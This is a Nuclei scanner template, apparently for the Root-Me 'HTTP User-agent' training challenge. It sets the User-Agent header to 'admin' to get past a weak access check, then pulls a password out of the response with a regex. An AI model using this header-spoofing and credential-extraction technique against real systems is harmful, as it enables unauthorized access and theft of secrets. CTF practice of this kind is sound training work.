id: HTTP-User-agent

info:
  name: HTTP User-agent
  author: Tomitom13
  severity: unknown
  tags: user-agent,http,rootme

requests:
  - method: GET
    path:
      - "{{BaseURL}}"
    headers:
      User-Agent: "admin"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "<h3>Welcome master!"
        part: body

    extractors:
      - type: regex
        name: password
        part: body
        regex:
          - "Password: [a-zA-Z0-9!@#$%^&*()_+,.<>?]+"
